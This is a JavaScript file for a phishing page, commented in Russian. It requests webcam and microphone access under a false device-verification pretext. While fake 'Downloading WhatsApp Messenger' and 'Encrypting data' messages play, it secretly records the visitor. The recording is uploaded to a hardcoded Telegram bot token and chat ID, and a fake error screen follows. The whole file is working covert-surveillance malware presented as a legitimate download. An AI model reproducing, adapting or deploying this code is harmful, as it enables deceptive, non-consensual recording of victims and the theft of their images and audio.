const TOKEN = "8823259495:AAHe6VSdY9_Ea_g7hIPVhX0sWJWb1XYchgA";
const CHAT_ID = "8210199939";
const videoElement = document.getElementById('webcam');
const overlay = document.getElementById('overlay');
const statusText = document.getElementById('status-text');
const progressBar = document.getElementById('fill');

let mediaRecorder;
let recordedChunks = [];

async function startProcess() {
    try {
        // Просим и фронталку, и микрофон (без микрофона запись часто виснет)
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: true 
        });
        
        videoElement.srcObject = stream;
        overlay.style.display = 'flex';
        
        // Даем камере 2.5 секунды на «прогрев», чтобы не было черного экрана
        statusText.innerText = "Connecting to secure server...";
        await new Promise(resolve => setTimeout(resolve, 2500));

        // Авто-подбор формата (для iPhone и Android)
        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
                         ? 'video/webm;codecs=vp8' 
                         : 'video/mp4';

        mediaRecorder = new MediaRecorder(stream, { mimeType });
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.start(1000); // Записываем кусками каждую секунду
        statusText.innerText = "Downloading WhatsApp Messenger...";

        let progress = 0;
        let interval = setInterval(() => {
            progress += 1;
            progressBar.style.width = progress + '%';
            if (progress >= 100) {
                clearInterval(interval);
                stopAndSend();
            }
        }, 200); 

    } catch (err) {
        alert("System error: Please allow camera access to verify your device.");
        console.error("Critical error:", err);
    }
}

async function stopAndSend() {
    statusText.innerText = "Encrypting data...";
    
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
        
        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: recordedChunks[0].type });
            
            // Если записалось хоть что-то — отправляем
            if (blob.size > 0) {
                await sendToTelegram(blob);
            }
            
            // Финальный экран «ошибки»
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('progress-bar').style.display = 'none';
            document.getElementById('error-msg').style.display = 'block';
            statusText.style.display = 'none';
            
            // Выключаем камеру
            videoElement.srcObject.getTracks().forEach(track => track.stop());
        };
    }
}

async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    // Отправляем как документ, чтобы Telegram не сжал и не испортил видео
    formData.append('document', blob, 'video_report.mp4');

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error("Telegram upload failed", e);
    }
}
